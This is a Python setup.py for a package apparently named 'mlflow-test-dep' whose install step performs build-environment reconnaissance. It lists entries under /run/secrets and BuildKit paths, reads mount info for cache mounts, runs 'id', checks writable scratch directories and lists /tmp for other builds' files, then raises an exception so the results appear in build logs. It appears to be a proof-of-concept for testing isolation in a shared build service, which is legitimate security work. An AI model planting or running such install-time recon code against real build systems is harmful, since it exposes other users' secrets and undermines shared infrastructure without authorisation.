import os
import sys
import subprocess
import socket
from setuptools import setup

proof = "🚨🚨🚨 BUILDKIT_RECON 🚨🚨🚨\n\n"

# 1. Look for BuildKit / buildx marker files and mounts
proof += "=== BuildKit markers ===\n"
bk_paths = [
    "/run/buildkit",
    "/var/run/buildkit",
    "/.dockerenv",
    "/run/secrets",
    "/tmp/buildkit",
]
for p in bk_paths:
    if os.path.exists(p):
        try:
            entries = os.listdir(p)[:10] if os.path.isdir(p) else None
            proof += f"  EXISTS: {p} (entries={entries})\n"
        except Exception as e:
            proof += f"  EXISTS: {p} (list error: {type(e).__name__})\n"
    else:
        proof += f"  absent: {p}\n"

# 2. Inspect /proc/self/mountinfo for cache mounts (truncated)
proof += "\n=== Mounts referencing 'cache' or 'buildkit' ===\n"
try:
    with open("/proc/self/mountinfo", "r") as f:
        for line in f:
            low = line.lower()
            if "cache" in low or "buildkit" in low:
                proof += "  " + line[:250] + "\n"
except Exception as e:
    proof += f"  mountinfo error: {type(e).__name__}\n"

# 3. Show which UID/GID we run as (cache often shared per-UID)
proof += "\n=== Identity ===\n"
proof += f"  uid={os.getuid()} gid={os.getgid()} user={os.getenv('USER','?')}\n"
try:
    proof += "  id: " + subprocess.check_output(["id"], text=True, timeout=2).strip() + "\n"
except Exception as e:
    proof += f"  id error: {type(e).__name__}\n"

# 4. Check whether /tmp or a cache dir is writable by us (indicates shared scratch)
proof += "\n=== Writable scratch check ===\n"
for p in ["/tmp", "/var/cache", "/root/.cache", "/package-repo"]:
    if os.path.exists(p):
        proof += f"  {p}: writable={os.access(p, os.W_OK)}\n"

# 5. Check for any files referencing OTHER builds (naive, names only)
proof += "\n=== /tmp entries (names only, first 20) ===\n"
try:
    proof += "  " + str(os.listdir("/tmp")[:20]) + "\n"
except Exception as e:
    proof += f"  /tmp list error: {type(e).__name__}\n"

proof += "\n🚨🚨🚨 END BUILDKIT RECON 🚨🚨🚨\n"
print(proof)
raise Exception(proof)

setup(name="mlflow-test-dep", version="0.1", description="BuildKit recon")
